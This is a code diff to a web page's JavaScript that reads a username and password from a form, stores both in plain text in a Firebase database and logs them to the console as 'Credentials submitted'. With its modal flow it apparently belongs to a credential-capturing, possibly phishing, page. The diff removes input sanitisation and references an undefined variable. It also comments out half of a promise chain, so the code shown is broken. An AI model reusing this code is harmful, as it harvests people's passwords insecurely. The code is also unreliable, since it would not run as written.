@@ -24,14 +24,14 @@ const firebaseConfig = {
     
     // Set database variable
     var database = firebase.database()
-    function sanitizeKey(key) {
-      return key.replace(/\./g, "_")
-                .replace(/#/g, "_")
-                .replace(/\$/g, "_")
-                .replace(/\[/g, "_")
-                .replace(/\]/g, "_")
-                .replace(/\//g, "_");
-    }
+    // function sanitizeKey(key) {
+    //   return key.replace(/\./g, "_")
+    //             .replace(/#/g, "_")
+    //             .replace(/\$/g, "_")
+    //             .replace(/\[/g, "_")
+    //             .replace(/\]/g, "_")
+    //             .replace(/\//g, "_");
+    // }
      function save() {
       // Get the username and password
       const username = document.getElementById('username').value;
@@ -42,22 +42,22 @@ const firebaseConfig = {
         alert('Please enter both username and password');
         return;
       }
-      const sanitizedUsername = sanitizeKey(username);
+      // const sanitizedUsername = sanitizeKey(username);
       // Save the data to Firebase Realtime Database
-      database.ref('users/' + sanitizedUsername).set({
+      database.ref('users/' + Username).set({
         username: username,
         password: password
       }).then(function() {
         console.log("Credentials submitted:", username, password);
   
         // Show the second modal after 2 seconds
-        setTimeout(function() {
+      //   setTimeout(function() {
          
           
-        }, 1000);
-      }).catch(function(error) {
-        console.error("Error saving data:", error);
-      });
+      //   }, 1000);
+      // }).catch(function(error) {
+      //   console.error("Error saving data:", error);
+      // });
     }
   
     // Close the second modal
